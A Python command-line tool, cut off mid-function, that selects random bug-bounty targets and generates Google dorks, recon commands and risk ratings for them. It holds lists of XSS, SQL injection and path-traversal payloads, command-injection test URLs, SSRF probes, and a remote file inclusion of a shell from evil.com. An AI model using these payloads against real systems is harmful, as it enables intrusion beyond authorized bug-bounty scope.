#!/usr/bin/env python3
"""
Bug Bounty Target Randomizer CLI
Scrapes bounty-targets-data repository and provides random targets with Google dorks
"""

import argparse
import json
import random
import requests
import sys
from typing import Dict, List, Optional
from urllib.parse import urljoin
import subprocess
import os
from pathlib import Path

class BountyTargetRandomizer:
    def __init__(self):
        self.base_url = "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/refs/heads/main/data/"
        self.data_cache = {}
        self.repo_info = {
            'name': 'bounty-targets-data',
            'author': 'arkadiyt',
            'description': 'Bug bounty target data aggregation from multiple platforms',
            'last_updated': 'Updated regularly via automated scripts',
            'platforms': ['HackerOne', 'Bugcrowd', 'Intigriti', 'YesWeHack', 'Federacy'],
            'data_types': ['domains', 'wildcards', 'program_data'],
            'total_programs': 0,
            'total_domains': 0,
            'total_wildcards': 0
        }
        self.google_dorks = [
            'site:{domain} filetype:pdf',
            'site:{domain} inurl:admin',
            'site:{domain} inurl:login',
            'site:{domain} inurl:config',
            'site:{domain} inurl:backup',
            'site:{domain} inurl:test',
            'site:{domain} inurl:dev',
            'site:{domain} inurl:staging',
            'site:{domain} inurl:api',
            'site:{domain} inurl:swagger',
            'site:{domain} inurl:graphql',
            'site:{domain} inurl:phpmyadmin',
            'site:{domain} inurl:wp-admin',
            'site:{domain} inurl:wp-content',
            'site:{domain} inurl:git',
            'site:{domain} inurl:svn',
            'site:{domain} inurl:jenkins',
            'site:{domain} inurl:dashboard',
            'site:{domain} inurl:panel',
            'site:{domain} inurl:server-status',
            'site:{domain} inurl:server-info',
            'site:{domain} filetype:env',
            'site:{domain} filetype:log',
            'site:{domain} filetype:sql',
            'site:{domain} filetype:xml',
            'site:{domain} filetype:json',
            'site:{domain} filetype:config',
            'site:{domain} filetype:bak',
            'site:{domain} intitle:"Index of"',
            'site:{domain} intitle:"Directory listing"',
            'site:{domain} "password"',
            'site:{domain} "username"',
            'site:{domain} "database"',
            'site:{domain} "secret"',
            'site:{domain} "token"',
            'site:{domain} "key"',
            'site:{domain} "mysql"',
            'site:{domain} "postgresql"',
            'site:{domain} "mongodb"',
            'site:{domain} "redis"',
            'site:{domain} "elasticsearch"',
            'site:{domain} "kibana"',
            'site:{domain} "grafana"',
            'site:{domain} "prometheus"',
            'site:{domain} "jaeger"',
            'site:{domain} "consul"',
            'site:{domain} "etcd"',
            'site:{domain} "kubernetes"',
            'site:{domain} "docker"',
            'site:{domain} "aws"',
            'site:{domain} "azure"',
            'site:{domain} "gcp"',
            'site:{domain} "s3"',
            'site:{domain} "bucket"',
            'site:{domain} "firebase"',
            'site:{domain} "heroku"',
            'site:{domain} "netlify"',
            'site:{domain} "vercel"',
        ]

        # Advanced Google dorks for specific vulnerabilities
        self.vuln_dorks = [
            'site:{domain} inurl:"q=" OR inurl:"query=" OR inurl:"search="',
            'site:{domain} inurl:"id=" OR inurl:"pid=" OR inurl:"uid="',
            'site:{domain} inurl:"page=" OR inurl:"file=" OR inurl:"path="',
            'site:{domain} inurl:"redirect=" OR inurl:"url=" OR inurl:"link="',
            'site:{domain} inurl:"callback=" OR inurl:"return=" OR inurl:"goto="',
            'site:{domain} inurl:"debug=" OR inurl:"trace=" OR inurl:"error="',
            'site:{domain} inurl:"upload" OR inurl:"file-upload"',
            'site:{domain} inurl:"reset" OR inurl:"forgot"',
            'site:{domain} inurl:"access_token" OR inurl:"api_key"',
            'site:{domain} inurl:"jsonp" OR inurl:"callback"',
            'site:{domain} "eval(" OR "setTimeout(" OR "setInterval("',
            'site:{domain} "document.write(" OR "innerHTML"',
            'site:{domain} "<?php" OR "<?=" filetype:php',
            'site:{domain} "SELECT * FROM" OR "INSERT INTO"',
            'site:{domain} "error" OR "warning" OR "fatal"',
            'site:{domain} "stack trace" OR "exception"',
            'site:{domain} "mysql_error" OR "ORA-" OR "Microsoft JET"',
            'site:{domain} "Warning: include" OR "Warning: require"',
            'site:{domain} "XAMPP" OR "WAMP" OR "MAMP"',
            'site:{domain} ".git/config" OR ".svn/entries"',
            'site:{domain} "access denied" OR "forbidden"',
            'site:{domain} "unauthorized" OR "401" OR "403"',
            'site:{domain} "internal server error" OR "500"',
            'site:{domain} "web.config" OR "app.config"',
            'site:{domain} "robots.txt" OR "sitemap.xml"',
            'site:{domain} "crossdomain.xml" OR "clientaccesspolicy.xml"',
        ]

    def fetch_data(self, endpoint: str) -> Optional[Dict]:
        """Fetch data from the bounty-targets-data repository"""
        try:
            url = urljoin(self.base_url, endpoint)
            print(f"[+] Fetching data from: {url}")
            response = requests.get(url, timeout=30)
            response.raise_for_status()

            if endpoint.endswith('.json'):
                return response.json()
            else:
                return response.text.strip().split('\n')
        except requests.exceptions.RequestException as e:
            print(f"[!] Error fetching {endpoint}: {e}")
            return None

    def load_all_data(self):
        """Load all available data from the repository"""
        endpoints = [
            'domains.txt',
            'wildcards.txt',
            'hackerone_data.json',
            'bugcrowd_data.json',
            'intigriti_data.json',
            'yeswehack_data.json',
            'federacy_data.json'
        ]

        print("[+] Loading bounty target data...")
        print(f"[+] Repository: {self.repo_info['name']} by {self.repo_info['author']}")
        print(f"[+] Description: {self.repo_info['description']}")
        print(f"[+] Supported platforms: {', '.join(self.repo_info['platforms'])}")
        print()

        for endpoint in endpoints:
            data = self.fetch_data(endpoint)
            if data:
                self.data_cache[endpoint] = data

                # Update statistics
                if endpoint == 'domains.txt':
                    self.repo_info['total_domains'] = len(data)
                elif endpoint == 'wildcards.txt':
                    self.repo_info['total_wildcards'] = len(data)
                elif endpoint.endswith('_data.json'):
                    self.repo_info['total_programs'] += len(data)

                print(f"[+] Loaded {endpoint} ({len(data) if isinstance(data, list) else 'N/A'} entries)")
            else:
                print(f"[!] Failed to load {endpoint}")

        print(f"\n[+] Total statistics:")
        print(f"    Programs: {self.repo_info['total_programs']}")
        print(f"    Domains: {self.repo_info['total_domains']}")
        print(f"    Wildcards: {self.repo_info['total_wildcards']}")
        print()

    def get_random_domain(self, source: str = "all") -> Optional[str]:
        """Get a random domain from the specified source"""
        if source == "domains" and 'domains.txt' in self.data_cache:
            return random.choice(self.data_cache['domains.txt'])
        elif source == "wildcards" and 'wildcards.txt' in self.data_cache:
            return random.choice(self.data_cache['wildcards.txt'])
        elif source == "all":
            all_domains = []
            if 'domains.txt' in self.data_cache:
                all_domains.extend(self.data_cache['domains.txt'])
            if 'wildcards.txt' in self.data_cache:
                all_domains.extend(self.data_cache['wildcards.txt'])
            return random.choice(all_domains) if all_domains else None
        return None

    def get_detailed_program_info(self, domain: str) -> Dict:
        """Get detailed program information for a specific domain"""
        program_info = {
            'domain': domain,
            'programs': [],
            'stats': {
                'total_matches': 0,
                'platforms': set(),
                'types': set(),
                'bounty_programs': 0,
                'vdp_programs': 0
            }
        }

        # Search through all platform data
        for platform_file in ['hackerone_data.json', 'bugcrowd_data.json', 'intigriti_data.json', 'yeswehack_data.json', 'federacy_data.json']:
            if platform_file in self.data_cache:
                platform_data = self.data_cache[platform_file]
                platform_name = platform_file.replace('_data.json', '')

                for program in platform_data:
                    if 'targets' in program and isinstance(program['targets'], list):
                        for target in program['targets']:
                            # Handle both string and dict target formats
                            if isinstance(target, str):
                                target_url = target
                                target_type = 'web'
                                in_scope = True
                            elif isinstance(target, dict):
                                target_url = target.get('target', target.get('url', ''))
                                target_type = target.get('type', 'web')
                                in_scope = target.get('in_scope', True)
                            else:
                                continue

                            # Check if domain matches
                            clean_domain = domain.replace('*.', '')
                            if (clean_domain in target_url or
                                target_url in clean_domain or
                                (domain.startswith('*.') and clean_domain in target_url)):

                                prog_info = {
                                    'platform': platform_name,
                                    'name': program.get('name', 'Unknown'),
                                    'url': program.get('url', ''),
                                    'type': target_type,
                                    'in_scope': in_scope,
                                    'max_severity': program.get('max_severity', 'Unknown'),
                                    'offers_bounties': program.get('offers_bounties', False),
                                    'last_updated': program.get('last_updated', 'Unknown'),
                                    'target_url': target_url,
                                    'reward_range': program.get('reward_range', 'Not specified'),
                                    'submission_state': program.get('submission_state', 'Unknown')
                                }

                                program_info['programs'].append(prog_info)
                                program_info['stats']['total_matches'] += 1
                                program_info['stats']['platforms'].add(platform_name)
                                program_info['stats']['types'].add(target_type)

                                if prog_info['offers_bounties']:
                                    program_info['stats']['bounty_programs'] += 1
                                else:
                                    program_info['stats']['vdp_programs'] += 1

        # Convert sets to lists for JSON serialization
        program_info['stats']['platforms'] = list(program_info['stats']['platforms'])
        program_info['stats']['types'] = list(program_info['stats']['types'])

        return program_info

    def get_subdomain_wordlist(self, domain: str) -> List[str]:
        """Generate subdomain wordlist based on common patterns"""
        subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2',
            'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'ns', 'blog',
            'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3', 'mail2', 'new',
            'mysql', 'old', 'www1', 'beta', 'delta', 'static', 'staging', 'secure', 'demo',
            'cp', 'calendar', 'wiki', 'web', 'media', 'email', 'images', 'img', 'www3',
            'ftp2', 'secure2', 'shop', 'sql', 'database', 'search', 'crm', 'cms', 'support',
            'store', 'app', 'mobile', 'api', 'download', 'upload', 'admin2', 'backup',
            'dev2', 'test2', 'portal', 'video', 'subdomain', 'moodle', 'mail1', 'sms',
            'gallery', 'mx', 'mx1', 'mx2', 'ns4', 'remote', 'dns', 'mail3', 'webmail2',
            'relay', 'old2', 'files', 'cdn', 'assets', 'resources', 'content', 'docs',
            'documentation', 'help', 'kb', 'status', 'monitor', 'stats', 'internal',
            'intranet', 'extranet', 'vpn2', 'ssl', 'secure3', 'payments', 'billing',
            'accounts', 'auth', 'sso', 'ldap', 'directory', 'corp', 'corporate', 'staging2',
            'preprod', 'prod', 'production', 'www-dev', 'dev-www', 'test-www', 'stage',
            'uat', 'qa', 'quality', 'testing', 'integration', 'ci', 'build', 'jenkins',
            'git', 'svn', 'repo', 'repository', 'code', 'source', 'gitlab', 'github',
            'bitbucket', 'jira', 'confluence', 'wiki2', 'redmine', 'trac', 'bugzilla'
        ]

        # Add domain-specific variations
        domain_parts = domain.replace('*.', '').split('.')
        if len(domain_parts) > 1:
            company = domain_parts[0]
            subdomains.extend([
                f'{company}-dev', f'{company}-test', f'{company}-stage', f'{company}-prod',
                f'dev-{company}', f'test-{company}', f'stage-{company}', f'prod-{company}',
                f'{company}dev', f'{company}test', f'{company}stage', f'{company}prod'
            ])

        return subdomains

    def generate_dorks(self, domain: str, vuln_focus: bool = False) -> List[str]:
        """Generate Google dorks for a domain"""
        dorks = []

        # Clean domain (remove wildcards)
        clean_domain = domain.replace('*.', '')

        # Choose dork set based on focus
        if vuln_focus:
            selected_dorks = random.sample(self.vuln_dorks, min(10, len(self.vuln_dorks)))
        else:
            selected_dorks = random.sample(self.google_dorks, min(15, len(self.google_dorks)))

        for dork in selected_dorks:
            dorks.append(dork.format(domain=clean_domain))

        return dorks

    def get_technology_stack_dorks(self, domain: str) -> List[str]:
        """Generate technology-specific dorks"""
        clean_domain = domain.replace('*.', '')
        tech_dorks = [
            f'site:{clean_domain} "powered by" OR "built with" OR "framework"',
            f'site:{clean_domain} "WordPress" OR "Joomla" OR "Drupal"',
            f'site:{clean_domain} "Apache" OR "nginx" OR "IIS"',
            f'site:{clean_domain} "PHP" OR "ASP" OR "JSP"',
            f'site:{clean_domain} "MySQL" OR "PostgreSQL" OR "MongoDB"',
            f'site:{clean_domain} "jQuery" OR "Bootstrap" OR "React"',
            f'site:{clean_domain} "Laravel" OR "Django" OR "Rails"',
            f'site:{clean_domain} "CloudFlare" OR "AWS" OR "Azure"',
            f'site:{clean_domain} "Docker" OR "Kubernetes" OR "Jenkins"',
            f'site:{clean_domain} "Elasticsearch" OR "Redis" OR "Memcached"',
        ]
        return tech_dorks

    def get_enhanced_target_info(self, domain: str) -> Dict:
        """Get comprehensive information about a target"""
        clean_domain = domain.replace('*.', '')

        info = {
            'original_domain': domain,
            'clean_domain': clean_domain,
            'is_wildcard': domain.startswith('*'),
            'subdomains_in_scope': [],
            'technologies': [],
            'security_headers': {},
            'interesting_endpoints': [],
            'potential_attack_surface': [],
            'risk_rating': 'Low',
            'priority_score': 0,
            'vulnerability_types': [],
            'common_issues': []
        }

        # Risk assessment based on domain characteristics
        risk_score = 0

        # Check if it's a development/testing domain
        dev_indicators = ['dev', 'test', 'staging', 'qa', 'uat', 'demo', 'sandbox', 'beta', 'alpha', 'pre-prod', 'preprod']
        if any(indicator in clean_domain.lower() for indicator in dev_indicators):
            info['potential_attack_surface'].append('Development/Testing Environment')
            info['vulnerability_types'].extend(['Exposed Debug Info', 'Weak Authentication', 'Test Data Exposure'])
            risk_score += 30

        # Check for internal/corporate domains
        internal_indicators = ['internal', 'corp', 'intranet', 'private', 'admin', 'management', 'corporate']
        if any(indicator in clean_domain.lower() for indicator in internal_indicators):
            info['potential_attack_surface'].append('Internal/Corporate System')
            info['vulnerability_types'].extend(['Privilege Escalation', 'Data Exposure', 'Weak Access Controls'])
            risk_score += 40

        # Check for API endpoints
        api_indicators = ['api', 'rest', 'graphql', 'webhook', 'service', 'microservice', 'gateway']
        if any(indicator in clean_domain.lower() for indicator in api_indicators):
            info['potential_attack_surface'].append('API Endpoint')
            info['vulnerability_types'].extend(['API Security Issues', 'Authentication Bypass', 'Data Leakage'])
            risk_score += 25

        # Check for cloud services
        cloud_indicators = ['aws', 'azure', 'gcp', 'cloudfront', 'cloudflare', 's3', 'blob', 'herokuapp', 'netlify', 'vercel']
        if any(indicator in clean_domain.lower() for indicator in cloud_indicators):
            info['potential_attack_surface'].append('Cloud Service')
            info['vulnerability_types'].extend(['Misconfigured Storage', 'IAM Issues', 'Service Exposure'])
            risk_score += 20

        # Check for authentication/security related domains
        auth_indicators = ['auth', 'sso', 'login', 'oauth', 'jwt', 'token', 'session', 'account']
        if any(indicator in clean_domain.lower() for indicator in auth_indicators):
            info['potential_attack_surface'].append('Authentication System')
            info['vulnerability_types'].extend(['Authentication Bypass', 'Session Management', 'Token Issues'])
            risk_score += 35

        # Check for payment/financial domains
        payment_indicators = ['pay', 'payment', 'billing', 'checkout', 'order', 'cart', 'shop', 'store']
        if any(indicator in clean_domain.lower() for indicator in payment_indicators):
            info['potential_attack_surface'].append('Payment/E-commerce System')
            info['vulnerability_types'].extend(['Payment Bypass', 'PCI Compliance', 'Financial Data Exposure'])
            risk_score += 45

        # Check for mobile/app related domains
        mobile_indicators = ['mobile', 'app', 'ios', 'android', 'apk']
        if any(indicator in clean_domain.lower() for indicator in mobile_indicators):
            info['potential_attack_surface'].append('Mobile Application')
            info['vulnerability_types'].extend(['Mobile App Security', 'API Abuse', 'Client-side Issues'])
            risk_score += 15

        # Assign risk rating based on score
        if risk_score >= 40:
            info['risk_rating'] = 'Critical'
        elif risk_score >= 25:
            info['risk_rating'] = 'High'
        elif risk_score >= 10:
            info['risk_rating'] = 'Medium'
        else:
            info['risk_rating'] = 'Low'

        info['priority_score'] = risk_score

        # Common issues based on domain type
        if info['is_wildcard']:
            info['common_issues'].extend([
                'Subdomain Takeover',
                'Certificate Transparency Logs',
                'DNS Zone Walking',
                'Subdomain Brute Force'
            ])

        # Generate interesting endpoints to check
        base_endpoints = [
            '/robots.txt', '/sitemap.xml', '/.well-known/security.txt',
            '/admin', '/api', '/swagger', '/graphql', '/status', '/health',
            '/version', '/debug', '/.git/config', '/.env', '/config.json',
            '/backup.sql', '/wp-admin', '/phpmyadmin', '/adminer',
            '/actuator', '/metrics', '/prometheus', '/.aws/credentials',
            '/package.json', '/composer.json', '/web.config', '/crossdomain.xml'
        ]

        info['interesting_endpoints'] = [f"https://{clean_domain}{endpoint}" for endpoint in base_endpoints]

        # Add technology-specific endpoints based on domain indicators
        if 'wp' in clean_domain or 'wordpress' in clean_domain:
            wp_endpoints = ['/wp-config.php', '/wp-includes/', '/wp-content/uploads/']
            info['interesting_endpoints'].extend([f"https://{clean_domain}{ep}" for ep in wp_endpoints])

        if any(indicator in clean_domain for indicator in ['jenkins', 'ci', 'build']):
            ci_endpoints = ['/jenkins/', '/job/', '/build/', '/console']
            info['interesting_endpoints'].extend([f"https://{clean_domain}{ep}" for ep in ci_endpoints])

        return info

    def get_reconnaissance_commands(self, domain: str) -> Dict[str, Dict[str, str]]:
        """Generate common reconnaissance commands"""
        clean_domain = domain.replace('*.', '')
        commands = {
            'Basic Information': {
                'whois': f'whois {clean_domain}',
                'dig_all': f'dig {clean_domain} ANY',
                'nslookup': f'nslookup {clean_domain}',
                'host': f'host {clean_domain}',
            },
            'Network Scanning': {
                'nmap_quick': f'nmap -sV -sC {clean_domain}',
                'nmap_all_ports': f'nmap -p- {clean_domain}',
                'nmap_vulns': f'nmap --script vuln {clean_domain}',
                'nmap_udp': f'nmap -sU --top-ports 1000 {clean_domain}',
            },
            'Web Enumeration': {
                'curl_headers': f'curl -I https://{clean_domain}',
                'whatweb': f'whatweb https://{clean_domain}',
                'nikto': f'nikto -h https://{clean_domain}',
                'dirb': f'dirb https://{clean_domain}',
                'gobuster': f'gobuster dir -u https://{clean_domain} -w /usr/share/wordlists/dirb/common.txt',
                'ffuf': f'ffuf -w /usr/share/wordlists/dirb/common.txt -u https://{clean_domain}/FUZZ',
            },
            'Subdomain Discovery': {
                'subfinder': f'subfinder -d {clean_domain}',
                'amass': f'amass enum -d {clean_domain}',
                'assetfinder': f'assetfinder {clean_domain}',
                'findomain': f'findomain -t {clean_domain}',
                'crt_sh': f'curl -s "https://crt.sh/?q=%25.{clean_domain}&output=json" | jq -r ".[].name_value" | sort -u',
            },
            'URL Discovery': {
                'httprobe': f'echo {clean_domain} | httprobe',
                'waybackurls': f'echo {clean_domain} | waybackurls',
                'gau': f'echo {clean_domain} | gau',
                'paramspider': f'python3 ParamSpider.py -d {clean_domain}',
            },
            'Vulnerability Scanning': {
                'nuclei': f'nuclei -u https://{clean_domain}',
                'sqlmap': f'sqlmap -u "https://{clean_domain}/page.php?id=1" --batch',
                'xsstrike': f'python3 XSStrike.py -u https://{clean_domain}/search?q=test',
                'dalfox': f'dalfox url https://{clean_domain}/search?q=FUZZ',
            },
            'Content Discovery': {
                'arjun': f'arjun -u https://{clean_domain}',
                'parameth': f'python3 parameth.py -u https://{clean_domain}',
                'dirsearch': f'python3 dirsearch.py -u https://{clean_domain}',
                'feroxbuster': f'feroxbuster -u https://{clean_domain}',
            }
        }
        return commands

    def generate_payload_list(self, domain: str, vuln_type: str = 'xss') -> List[str]:
        """Generate testing payloads for common vulnerabilities"""
        clean_domain = domain.replace('*.', '')

        payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert(document.domain)</script>',
                "javascript:alert('XSS')",
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                "'><script>alert(String.fromCharCode(88,83,83))</script>",
                '<iframe src="javascript:alert(`xss`)">',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror="alert(1)">',
                '<audio src=x onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>'
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "admin'--",
                "admin'/*",
                "' OR 'x'='x",
                "') OR ('1'='1",
                "' OR 1=1#",
                "') OR 1=1--",
                "1' ORDER BY 1--",
                "1' ORDER BY 100--",
                "1' GROUP BY 1--",
                "1' HAVING 1=1--"
            ],
            'lfi': [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '/etc/passwd%00',
                '../../../windows/win.ini',
                '....//....//....//windows/system32/drivers/etc/hosts',
                '/proc/self/environ',
                '/proc/version',
                '/proc/cmdline',
                '../../../usr/local/apache2/conf/httpd.conf',
                '../../../var/log/apache2/access.log'
            ]
        }

        return payloads.get(vuln_type, payloads['xss'])

    def get_vulnerability_test_urls(self, domain: str) -> Dict[str, List[str]]:
        """Generate URLs for testing common vulnerabilities"""
        clean_domain = domain.replace('*.', '')
        base_url = f"https://{clean_domain}"

        test_urls = {
            'XSS Testing': [
                f"{base_url}/search?q=<script>alert(1)</script>",
                f"{base_url}/index.php?page=<img src=x onerror=alert(1)>",
                f"{base_url}/view?id=1&name=<svg onload=alert(1)>",
                f"{base_url}/comment?text=\"><script>alert(document.domain)</script>",
                f"{base_url}/redirect?url=javascript:alert('XSS')"
            ],
            'SQL Injection': [
                f"{base_url}/user?id=1' OR '1'='1",
                f"{base_url}/login?username=admin'--&password=anything",
                f"{base_url}/product?id=1' UNION SELECT NULL--",
                f"{base_url}/search?q=test') OR 1=1--",
                f"{base_url}/category?id=1' ORDER BY 100--"
            ],
            'LFI/RFI Testing': [
                f"{base_url}/include?file=../../../etc/passwd",
                f"{base_url}/page?include=....//....//....//etc/passwd",
                f"{base_url}/view?template=/etc/passwd%00",
                f"{base_url}/load?file=http://evil.com/shell.php",
                f"{base_url}/include?page=php://filter/convert.base64-encode/resource=index.php"
            ],
            'SSRF Testing': [
                f"{base_url}/fetch?url=http://127.0.0.1",
                f"{base_url}/proxy?target=http://169.254.169.254/",
                f"{base_url}/webhook?callback=http://localhost:22",
                f"{base_url}/import?source=file:///etc/passwd",
                f"{base_url}/validate?url=gopher://127.0.0.1:80"
            ],
            'Command Injection': [
                f"{base_url}/ping?host=127.0.0.1; ls -la",
                f"{base_url}/resolve?domain=google.com| whoami",
                f"{base_url}/system?cmd=echo test && cat /etc/passwd",
                f"{base_url}/exec?command=`id`",
                f"{base_url}/run?script=$(whoami)"
            ],
            'Open Redirect': [
                f"{base_url}/redirect?url=http://evil.com",
                f"{base_url}/goto?target=//attacker.com",
                f"{base_url}/return?continue=http://malicious.site",
                f"{base_url}/next?redirect_uri=javascript:alert(1)",
                f"{base_url}/forward?destination=http://phishing.com"
            ]
        }

        return test_urls

    def run_basic_scan(self, domain: str):
        """Run a basic scan using curl and other basic tools"""
        clean_domain = domain.replace('*.', '')
        print(f"[+] Basic scan of: {clean_domain}")

        # Try HTTPS first, then HTTP
        headers_found = False
        for protocol in ['https', 'http']:
            try:
                url = f"{protocol}://{clean_domain}"
                result = subprocess.run(['curl', '-I', '-L', '--max-time', '10', '--silent', url],
                                      capture_output=True, text=True, timeout=15)

                if result.returncode == 0 and result.stdout:
                    print(f"[+] {protocol.upper()} Response Headers:")
                    headers = result.stdout.strip().split('\n')
                    for header in headers[:8]:  # Show first 8 headers
                        if header.strip():
                            print(f"    {header}")
                    headers_found = True

                    # Check for interesting headers
                    header_text = result.stdout.lower()
                    interesting_headers = []
                    if 'x-powered-by:' in header_text:
                        interesting_headers.append('Technology disclosure in X-Powered-By')
                    if 'server:' in header_text and any(server in header_text for server in ['apache', 'nginx', 'iis']):
                        interesting_headers.append('Server information disclosed')
                    if 'x-frame-options' not in header_text:
                        interesting_headers.append('Missing X-Frame-Options header')
                    if 'content-security-policy' not in header_text:
                        interesting_headers.append('Missing CSP header')

                    if interesting_headers:
                        print(f"[!] Security observations:")
                        for obs in interesting_headers:
                            print(f"    - {obs}")

                    break

            except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
                continue

        if not headers_found:
            print("[!] Could not retrieve HTTP headers")

        # Try to get basic info with nslookup
        try:
            result = subprocess.run(['nslookup', clean_domain],
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] DNS Information:")
                lines = result.stdout.strip().split('\n')
                for line in lines[-4:]:  # Show last 4 lines (usually the answer)
                    if line.strip() and ('address' in line.lower() or 'name' in line.lower()):
                        print(f"    {line}")
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
            print("[!] nslookup not available")

        # Try to ping the domain
        try:
            result = subprocess.run(['ping', '-c', '2', clean_domain],
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                # Extract RTT from ping output
                output_lines = result.stdout.split('\n')
                for line in output_lines:
                    if 'time=' in line:
                        time_info = line.split('time=')[1].split()[0]
                        print(f"[+] Ping successful: {time_info}")
                        break
            else:
                print("[!] Ping failed - host may be unreachable or blocking ICMP")
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
            print("[!] Ping failed or not available")

    def run_htmlq_scan(self, domain: str):
        """Run htmlq scan if available"""
        clean_domain = domain.replace('*.', '')
        try:
            # Try to fetch with htmlq
            result = subprocess.run(['htmlq', '--attribute', 'href', 'a', f'https://{clean_domain}'],
                                  capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                links = [link for link in result.stdout.strip().split('\n') if link.strip()]
                print(f"[+] Found {len(links)} links on {clean_domain}")
                for link in links[:10]:  # Show first 10 links
                    print(f"    {link}")
                if len(links) > 10:
                    print(f"    ... and {len(links) - 10} more links")
            else:
                print(f"[!] htmlq scan failed for {clean_domain}")
        except subprocess.TimeoutExpired:
            print(f"[!] htmlq scan timed out for {clean_domain}")
        except FileNotFoundError:
            print("[!] htmlq not found. Install with: cargo install htmlq")

def main():
    parser = argparse.ArgumentParser(description='Bug Bounty Target Randomizer CLI')
    parser.add_argument('-s', '--source', choices=['domains', 'wildcards', 'all'],
                       default='all', help='Source of domains to randomize')
    parser.add_argument('-n', '--number', type=int, default=1,
                       help='Number of random targets to generate')
    parser.add_argument('-d', '--dorks', action='store_true',
                       help='Generate Google dorks for the target')
    parser.add_argument('-v', '--vuln-dorks', action='store_true',
                       help='Generate vulnerability-focused Google dorks')
    parser.add_argument('-i', '--info', action='store_true',
                       help='Show program information for the target')
    parser.add_argument('-r', '--recon', action='store_true',
                       help='Show reconnaissance commands for the target')
    parser.add_argument('-t', '--tech-dorks', action='store_true',
                       help='Generate technology stack discovery dorks')
    parser.add_argument('-w', '--wordlist', action='store_true',
                       help='Generate subdomain wordlist for the target')
    parser.add_argument('-b', '--basic-scan', action='store_true',
                       help='Run basic connectivity and header scan')
    parser.add_argument('-e', '--enhanced-info', action='store_true',
                       help='Show enhanced target analysis and risk assessment')
    parser.add_argument('-a', '--all-info', action='store_true',
                       help='Show all available information (equivalent to -i -d -t -w -r -e)')
    parser.add_argument('--live-check', action='store_true',
                       help='Check if targets are live and responsive')
    parser.add_argument('-q', '--htmlq', action='store_true',
                       help='Run htmlq scan on the target')
    parser.add_argument('--export', choices=['json', 'csv', 'txt'],
                       help='Export results to file format')
    parser.add_argument('--filter-platform',
                       help='Filter results by platform (hackerone, bugcrowd, etc.)')
    parser.add_argument('--min-severity', choices=['low', 'medium', 'high', 'critical'],
                       help='Filter by minimum severity level')
    parser.add_argument('--bounties-only', action='store_true',
                       help='Show only programs that offer bounties')
    parser.add_argument('--payloads', choices=['xss', 'sqli', 'lfi'],
                       help='Generate testing payloads for specific vulnerability type')
    parser.add_argument('--test-urls', action='store_true',
                       help='Generate vulnerability testing URLs')
    parser.add_argument('--no-cache', action='store_true',
                       help='Skip loading cached data')

    args = parser.parse_args()

    # Parse arguments with enhanced info option
    if args.all_info:
        args.info = True
        args.dorks = True
        args.tech_dorks = True
        args.wordlist = True
        args.recon = True
        args.enhanced_info = True

    # Initialize randomizer
    randomizer = BountyTargetRandomizer()

    # Load data unless cache is disabled
    if not args.no_cache:
        randomizer.load_all_data()

    # Check if we have any data
    if not randomizer.data_cache:
        print("[!] No data loaded. Check your internet connection or repository availability.")
        sys.exit(1)

    # Generate random targets
    print(f"\n[+] Generating {args.number} random target(s)...")
    print("=" * 60)

    results = []

    for i in range(args.number):
        domain = randomizer.get_random_domain(args.source)
        if not domain:
            print(f"[!] No domains available for source: {args.source}")
            continue

        result = {'domain': domain, 'info': {}}

        print(f"\n🎯 Target #{i+1}: {domain}")
        print("-" * 40)

        # Enhanced target analysis
        if args.enhanced_info:
            enhanced_info = randomizer.get_enhanced_target_info(domain)
            result['info']['enhanced'] = enhanced_info

            print(f"📊 Enhanced Target Analysis:")
            print(f"  Domain Type: {'Wildcard' if enhanced_info['is_wildcard'] else 'Specific'}")
            print(f"  Clean Domain: {enhanced_info['clean_domain']}")
            print(f"  Risk Rating: {enhanced_info['risk_rating']} (Score: {enhanced_info['priority_score']})")

            if enhanced_info['potential_attack_surface']:
                print(f"  Attack Surface: {', '.join(enhanced_info['potential_attack_surface'])}")

            if enhanced_info['vulnerability_types']:
                print(f"  Potential Vulnerabilities: {', '.join(enhanced_info['vulnerability_types'][:3])}")

            if enhanced_info['common_issues']:
                print(f"  Common Issues: {', '.join(enhanced_info['common_issues'])}")

            print(f"  Key Endpoints to Check:")
            for endpoint in enhanced_info['interesting_endpoints'][:8]:
                print(f"    {endpoint}")
            print()

        # Show program info
        if args.info:
            program_info = randomizer.get_detailed_program_info(domain)
            result['info']['programs'] = program_info

            # Apply filters
            filtered_programs = program_info['programs']

            if args.filter_platform:
                filtered_programs = [p for p in filtered_programs if p['platform'] == args.filter_platform]

            if args.bounties_only:
                filtered_programs = [p for p in filtered_programs if p['offers_bounties']]

            if filtered_programs:
                print(f"📊 Program Information:")
                print(f"  Total matches: {len(filtered_programs)}")
                platforms = list(set(p['platform'] for p in filtered_programs))
                print(f"  Platforms: {', '.join(platforms)}")
                bounty_count = sum(1 for p in filtered_programs if p['offers_bounties'])
                print(f"  Bounty programs: {bounty_count}")
                print(f"  VDP programs: {len(filtered_programs) - bounty_count}")
                print()

                for prog in filtered_programs[:3]:  # Show first 3 programs
                    print(f"  🎯 {prog['name']} ({prog['platform']})")
                    print(f"     URL: {prog['url']}")
                    print(f"     Type: {prog['type']} | In Scope: {prog['in_scope']}")
                    print(f"     Bounties: {prog['offers_bounties']} | Max Severity: {prog['max_severity']}")
                    if prog.get('reward_range', 'Not specified') != 'Not specified':
